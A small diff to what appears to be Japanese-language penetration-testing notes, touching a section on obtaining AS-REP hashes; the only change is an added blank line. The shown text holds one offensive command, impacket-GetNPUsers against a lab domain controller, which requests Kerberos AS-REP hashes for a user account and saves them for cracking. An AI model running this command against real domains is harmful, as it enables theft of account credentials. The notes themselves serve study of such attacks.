@@ -23,6 +23,7 @@ nav_order: 303
 
 ## impacket-GetNPUsers
 ## AS-REPハッシュの取得
+
 ```bash
 impacket-GetNPUsers -dc-ip 192.168.158.70  -request -outputfile hashes.asreproast corp.com/pete
 ```
